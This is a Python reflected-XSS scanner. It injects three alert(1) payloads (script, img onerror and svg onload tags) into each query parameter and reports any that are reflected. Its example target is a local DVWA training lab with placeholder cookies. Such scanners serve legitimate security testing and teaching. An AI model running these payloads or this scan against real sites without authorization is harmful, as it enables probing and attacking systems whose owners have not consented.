import time
import re
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>"
]

# Regex patterns to detect reflected payloads
REFLECT_PATTERNS = [re.compile(re.escape(p), re.IGNORECASE) for p in XSS_PAYLOADS]

def get_session():
    """Returns a configured requests session with common headers."""
    session = requests.Session()
    session.headers.update({
        "User-Agent": "XSS-Scanner/1.0"
    })
    return session


def extract_params(url):
    """Extracts query params from a URL as a dict."""
    parsed = urlparse(url)
    return parse_qs(parsed.query)


def rebuild_url(parsed, params):
    """Rebuilds URL with modified query params."""
    new_query = urlencode(params, doseq=True)
    return urlunparse(parsed._replace(query=new_query))

class XSSScanner:
    def __init__(self, base_url, cookies=None, timeout=5):
        self.base_url = base_url
        self.session = get_session()
        if cookies:
            self.session.cookies.update(cookies)
        self.timeout = timeout
        self.findings = []

    def test_params(self, url):
        """Injects payloads into query params and checks response."""
        parsed = urlparse(url)
        params = extract_params(url)

        if not params:
            return  

        for param in params:
            for payload in XSS_PAYLOADS:
                test_params = params.copy()
                test_params[param] = payload

                test_url = rebuild_url(parsed, test_params)

                try:
                    res = self.session.get(test_url, timeout=self.timeout)
                    body = res.text

                    for pattern in REFLECT_PATTERNS:
                        if pattern.search(body):
                            self.findings.append({
                                "type": "Reflected XSS",
                                "url": test_url,
                                "param": param,
                                "payload": payload
                            })
                            print(f"[+] XSS found! {param} -> {payload}")
                            break

                except requests.RequestException:
                    pass

                time.sleep(0.1)  # avoid flooding

    def run(self):
        print(f"[*] Starting XSS scan on {self.base_url}")
        self.test_params(self.base_url)
        return self.findings

if __name__ == "__main__":
    #  Reflected XSS in DVWA
    target_url = "http://localhost/dvwa/vulnerabilities/xss_r/?name=test"

    # Update with your DVWA session cookies
    cookies = {
        "PHPSESSID": "your_session_id_here",
        "security": "low"
    }

    scanner = XSSScanner(target_url, cookies=cookies)
    results = scanner.run()

    print("\n--- Scan Results ---")
    for finding in results:
        print(finding)

